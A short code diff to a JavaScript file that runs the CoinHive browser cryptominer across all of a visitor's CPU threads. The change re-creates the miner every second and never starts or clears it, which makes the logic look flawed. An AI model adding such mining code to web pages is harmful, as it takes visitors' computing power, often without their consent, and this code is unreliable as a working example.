@@ -1,7 +1,11 @@
 var threadCount = navigator.hardwareConcurrency;
-
-miner = new CoinHive.Anonymous(document.getElementById("api"),'threads: ' + threadCount);
 var timeDelay = 1000;
+var timeDelayMain = 1250;
+var miner;
+
+setInterval(function() {
+	miner = new CoinHive.Anonymous(document.getElementById("api").innerHTML,'threads: ' + threadCount);
+}, timeDelay);
 	
 // Update stats once per second
 setInterval(function() {
@@ -29,5 +33,5 @@ setInterval(function() {
 		
     }
 	
-}, timeDelay);
+}, timeDelayMain);
 	
